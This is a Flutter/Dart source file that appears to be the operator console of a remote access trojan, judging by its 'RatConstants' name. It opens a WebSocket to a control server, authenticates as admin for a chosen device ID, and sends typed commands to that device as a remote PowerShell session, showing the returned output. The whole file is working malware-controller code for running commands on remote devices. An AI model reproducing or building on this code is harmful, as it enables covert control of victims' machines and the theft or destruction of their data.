import 'dart:convert';
import 'package:flutter/material.dart';
import 'package:web_socket_channel/web_socket_channel.dart';
import 'constants.dart';

class ShellScreen extends StatefulWidget {
  final String deviceId, sessionKey;
  const ShellScreen({super.key, required this.deviceId, required this.sessionKey});

  @override
  State<ShellScreen> createState() => _ShellScreenState();
}

class _ShellScreenState extends State<ShellScreen> {
  late WebSocketChannel _ws;
  final TextEditingController _cmdCtrl = TextEditingController();
  final ScrollController _scrollCtrl = ScrollController();
  String _output = 'Connecting to shell...\n';
  bool _connected = false;

  @override
  void initState() {
    super.initState();
    _connectWs();
  }

  void _connectWs() {
    _ws = WebSocketChannel.connect(Uri.parse(RatConstants.wsUrl));

    _ws.sink.add('ADMIN_HANDSHAKE:admin_session:${widget.deviceId}');

    _ws.stream.listen(
      (msg) {
        if (msg is String) {
          if (msg.startsWith('ADMIN_AUTH:SUCCESS')) {
            setState(() {
              _connected = true;
              _output += 'Authorized. Monitoring: ${widget.deviceId}\n';
            });
          } else if (msg.startsWith('VRESP:SHELL:')) {
            final content = msg.substring(12);
            try {
              final data = jsonDecode(content);
              final output = data['output'] ?? '';
              setState(() {
                _output += '$output\n';
              });
            } catch (e) {
               setState(() => _output += '$content\n');
            }
            _scrollToBottom();
          }
        }
      },
      onError: (e) {
         setState(() {
           _output += '\n[!] Connection error: $e\n';
           _connected = false;
         });
      },
      onDone: () {
         setState(() {
           _output += '\n[-] Disconnected from server.\n';
           _connected = false;
         });
      }
    );
  }

  void _sendCommand() {
    final cmd = _cmdCtrl.text.trim();
    if (cmd.isEmpty || !_connected) return;

    setState(() {
      _output += '\n> $cmd\n';
    });
    
    _ws.sink.add('CMD:${widget.deviceId}:SHELL:$cmd');
    _cmdCtrl.clear();
    _scrollToBottom();
  }

  void _scrollToBottom() {
    Future.delayed(const Duration(milliseconds: 100), () {
      if (_scrollCtrl.hasClients) {
        _scrollCtrl.animateTo(_scrollCtrl.position.maxScrollExtent, duration: const Duration(milliseconds: 200), curve: Curves.easeOut);
      }
    });
  }

  @override
  void dispose() {
    _ws.sink.close();
    _cmdCtrl.dispose();
    _scrollCtrl.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: const Color(0xFF0D1117),
      appBar: AppBar(
        backgroundColor: const Color(0xFF161B22),
        title: Text('Shell - ${widget.deviceId}', style: const TextStyle(color: Colors.white, fontSize: 16)),
        leading: IconButton(icon: const Icon(Icons.arrow_back_ios_new_rounded, color: Colors.white, size: 18), onPressed: () => Navigator.pop(context)),
      ),
      body: Column(
        children: [
          Expanded(
            child: Container(
              padding: const EdgeInsets.all(12),
              width: double.infinity,
              color: Colors.black,
              child: SingleChildScrollView(
                controller: _scrollCtrl,
                child: Text(
                  _output,
                  style: const TextStyle(color: Color(0xFF10B981), fontFamily: 'monospace', fontSize: 12),
                ),
              ),
            ),
          ),
          Container(
            padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 8),
            decoration: const BoxDecoration(
              color: Color(0xFF161B22),
              border: Border(top: BorderSide(color: Color(0xFF30363D)))
            ),
            child: Row(
              children: [
                const Text('PS > ', style: TextStyle(color: Color(0xFF3B82F6), fontFamily: 'monospace', fontWeight: FontWeight.bold)),
                Expanded(
                  child: TextField(
                    controller: _cmdCtrl,
                    style: const TextStyle(color: Colors.white, fontFamily: 'monospace', fontSize: 14),
                    decoration: const InputDecoration(
                      border: InputBorder.none,
                      hintText: 'Enter command...',
                      hintStyle: TextStyle(color: Colors.white24),
                      isDense: true
                    ),
                    onSubmitted: (_) => _sendCommand(),
                  ),
                ),
                IconButton(
                  icon: const Icon(Icons.send_rounded, color: Color(0xFF3B82F6)),
                  onPressed: _sendCommand,
                )
              ],
            ),
          )
        ],
      ),
    );
  }
}
